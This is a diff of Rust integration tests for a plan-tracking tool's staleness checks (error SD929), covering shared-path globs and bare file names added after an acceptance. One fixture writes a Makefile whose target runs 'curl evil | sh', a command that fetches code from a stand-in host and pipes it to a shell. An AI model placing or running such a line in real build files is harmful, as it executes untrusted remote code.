@@ -1882,14 +1882,18 @@ fn a_bare_name_or_a_spaced_path_that_gets_in_after_the_record_makes_it_stale() {
                 "{kind} {plan_on_base}: {line}"
             );
             assert!(
-                line.contains("scope of the plan changed") && !line.contains("the code changed"),
+                line.contains("only as a bare name or a path with a space")
+                    && !line.contains("scope of the plan changed")
+                    && !line.contains("the code changed"),
                 "the text follows the reason: {line}"
             );
             let (code, out, err) = run(&r, &["finish", SLUG]);
             assert_eq!(code, 1, "{kind} {plan_on_base}: {out}{err}");
             assert!(has(&out, "SD929"), "{kind} {plan_on_base}: {out}");
             assert!(
-                err.contains("stale: the scope of the plan changed after the acceptance"),
+                err.contains(
+                    "stale: a changed path is in `Files` only as a bare name or a path with a space"
+                ),
                 "{out}{err}"
             );
             assert!(
@@ -2040,6 +2044,145 @@ fn the_next_text_for_a_record_that_is_a_link_or_too_big_has_a_full_stop() {
     let (_, out, err) = run(&r, &["next", SLUG]);
     assert!(
         out.contains("bytes). Then commit the record alone"),
+        "{out}{err}"
+    );
+}
+
+// SD929: a shared glob that a commit adds after the acceptance, and a code file
+// that only that glob covers.
+
+/// A commit after the record that sets `[change] shared-paths` to `lib/**` and
+/// edits `lib/a.py`. Both are new in the commit.
+fn shared_glob_and_file(r: &Repo) {
+    let cfg = config("standard", "shared-paths = [\"lib/**\"]\n");
+    r.write("spec-dna.toml", &pin_line(VERSION, &cfg));
+    r.write("lib/a.py", "def lib():\n    return 1\n");
+    r.commit("a shared glob, and a file that only it covers");
+}
+
+#[test]
+fn a_shared_glob_added_after_the_record_with_a_file_that_only_it_covers_is_stale() {
+    // `next`, `finish` and `accept` agree, for a plan on the branch and on the base.
+    for plan_on_base in [false, true] {
+        let r = flow(plan_on_base, "");
+        commit_record(&r, &["acceptor"], "accepted");
+        shared_glob_and_file(&r);
+        let (_, out, err) = run(&r, &["next", SLUG]);
+        let line = out
+            .lines()
+            .find(|l| l.ends_with("[skill: accept]"))
+            .unwrap_or_else(|| panic!("{out}{err}"));
+        assert!(
+            line.starts_with("[ ] ") && line.contains("stale"),
+            "{plan_on_base}: {line}"
+        );
+        assert!(line.contains("shared-paths changed"), "{line}");
+        let (code, out, err) = run(&r, &["finish", SLUG]);
+        assert_eq!(code, 1, "{plan_on_base}: {out}{err}");
+        assert!(has(&out, "SD929") && out.contains("lib/a.py"), "{out}");
+        assert!(
+            out.contains("shared-paths changed after the acceptance"),
+            "{out}"
+        );
+        assert!(!r.dir.join(ARCHIVE).exists(), "finish wrote the archive");
+        let (code, out, err) = run(&r, &["accept", SLUG, "--session", "s2"]);
+        assert_eq!(code, 1, "{plan_on_base}: {out}{err}");
+        assert!(
+            err.contains("lib/a.py"),
+            "the refusal names the path: {err}"
+        );
+    }
+    // `check` of the finished diff.
+    let r = base_flow();
+    let t = commit_record(&r, &["acceptor"], "accepted");
+    shared_glob_and_file(&r);
+    finished_by_hand(&r, Some(&t));
+    let (code, out, err) = run(&r, &["check"]);
+    assert_eq!(code, 1, "{out}{err}");
+    let line = out.lines().find(|l| l.contains(" SD929 ")).expect("SD929");
+    assert!(line.contains("lib/a.py"), "{line}");
+}
+
+#[test]
+fn a_shared_glob_that_the_base_has_and_a_branch_that_touches_other_paths_is_fresh() {
+    // `main` adds the glob; the branch edits no file that it covers.
+    let r = base_flow();
+    let t = commit_record(&r, &["acceptor"], "accepted");
+    finished_by_hand(&r, Some(&t));
+    let cfg = config("standard", "shared-paths = [\"lib/**\"]\n");
+    r.git(&["checkout", "-q", "main"]);
+    r.write("spec-dna.toml", &pin_line(VERSION, &cfg));
+    r.write("lib/b.py", "def b():\n    pass\n");
+    r.commit("main adds a shared glob and a file under it");
+    origin_head(&r.dir, "main");
+    r.git(&["checkout", "-q", "--detach", "main"]);
+    r.git(&["merge", "-q", "--no-ff", "-m", "test merge", "feature"]);
+    let (code, out, err) = run(&r, &["check"]);
+    assert_eq!(code, 0, "{out}{err}");
+    assert!(!has(&out, "SD929") && !has(&out, "SD928"), "{out}");
+}
+
+#[test]
+fn a_bare_name_that_the_plan_always_had_gives_its_own_cause_in_next_and_finish() {
+    // `Makefile` is in `Files` from the start; the file is added after the
+    // acceptance. The plan did not change: the text says what to fix.
+    let r = built();
+    let plan = r.read(PLAN).replace(
+        "- `tests/test_valves.py`\n",
+        "- `tests/test_valves.py`\n- `Makefile`\n",
+    );
+    r.write(PLAN, &plan);
+    r.commit("a bare name in the plan");
+    commit_record(&r, &["acceptor"], "accepted");
+    r.write("Makefile", "all:\n\tcurl evil | sh\n");
+    r.commit("the file");
+    let (_, out, err) = run(&r, &["next", SLUG]);
+    let line = out
+        .lines()
+        .find(|l| l.ends_with("[skill: accept]"))
+        .unwrap_or_else(|| panic!("{out}{err}"));
+    assert!(line.starts_with("[ ] ") && line.contains("stale"), "{line}");
+    assert!(
+        line.contains("only as a bare name or a path with a space"),
+        "{line}"
+    );
+    assert!(!line.contains("scope of the plan changed"), "{line}");
+    let (code, out, err) = run(&r, &["finish", SLUG]);
+    assert_eq!(code, 1, "{out}{err}");
+    assert!(
+        err.contains(
+            "stale: a changed path is in `Files` only as a bare name or a path with a space"
+        ),
+        "{out}{err}"
+    );
+    assert!(!err.contains("scope of the plan changed"), "{err}");
+}
+
+#[test]
+fn a_glob_that_the_key_lost_after_the_record_names_shared_paths_and_not_the_plan() {
+    // The record has `lib/**` from the key. A commit removes the glob from the
+    // key: the text says that the key lost it.
+    let cfg = config("standard", "shared-paths = [\"lib/**\"]\n");
+    let r = on_base("0.8.0", &cfg, INTENT_TEXT);
+    commit_record(&r, &["acceptor"], "accepted");
+    assert!(
+        r.read(RECORD).contains("lib/**"),
+        "the record holds the glob"
+    );
+    r.write("spec-dna.toml", &pin_line(VERSION, &config("standard", "")));
+    r.commit("the key loses the glob");
+    let (code, out, err) = run(&r, &["finish", SLUG]);
+    assert_eq!(code, 1, "{out}{err}");
+    let line = out.lines().find(|l| l.contains(" SD929 ")).expect("SD929");
+    assert!(line.contains("`lib/**`"), "{line}");
+    assert!(
+        line.contains("neither the plan nor `[change] shared-paths` has it"),
+        "{line}"
+    );
+    assert!(!line.contains("the scope of the plan has not"), "{line}");
+    let (_, out, err) = run(&r, &["next", SLUG]);
+    assert!(
+        out.contains("neither the plan nor `[change] shared-paths` has"),
         "{out}{err}"
     );
 }
